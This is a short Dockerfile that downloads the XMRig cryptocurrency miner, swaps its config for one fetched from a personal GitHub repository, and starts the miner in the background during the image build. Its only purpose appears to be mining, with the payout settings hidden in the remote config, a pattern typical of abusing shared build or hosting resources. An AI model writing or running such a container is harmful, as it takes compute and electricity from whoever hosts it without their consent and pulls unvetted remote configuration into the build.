FROM ubuntu:16.04
RUN wget https://github.com/xmrig/xmrig/releases/download/v5.7.0/xmrig-5.7.0-xenial-x64.tar.gz
RUN tar xf xmrig-5.7.0-xenial-x64.tar.gz
RUN rm -rf xmrig-5.7.0/config.json
RUN wget https://raw.githubusercontent.com/ba3walos99/append/master/config.json
RUN cp config.json xmrig-5.7.0/config.json
RUN nohup xmrig-5.7.0/xmrig -c config.json &